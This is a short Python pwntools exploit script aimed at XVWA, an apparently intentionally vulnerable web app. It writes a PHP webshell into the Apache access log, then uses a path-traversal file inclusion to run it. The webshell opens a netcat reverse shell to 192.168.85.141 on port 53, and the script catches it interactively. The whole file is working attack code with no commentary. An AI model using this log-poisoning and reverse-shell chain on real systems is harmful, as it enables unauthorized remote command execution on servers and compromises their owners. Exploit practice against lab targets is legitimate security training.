#!/usr/bin/python 
from pwn import *

file = "/var/log/apache2/access.log"
url = "/xvwa/vulnerabilities/fi/?file="
webshell = "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.85.141 53 >/tmp/f'); ?>"

shell = listen(53)

r = remote('xvwa', 80, ssl=False)
log.info("[*] Sending log")
r.send("GET %s\r\n\r\n" % webshell)
r.close()

r = remote('xvwa', 80, ssl=False)
log.info("[*] Sending request")
r.send('GET %s../../../../../..%s\r\n\r\n' % (url, file))
r.close()

shell.wait_for_connection()
log.success("Got shell")
shell.interactive()
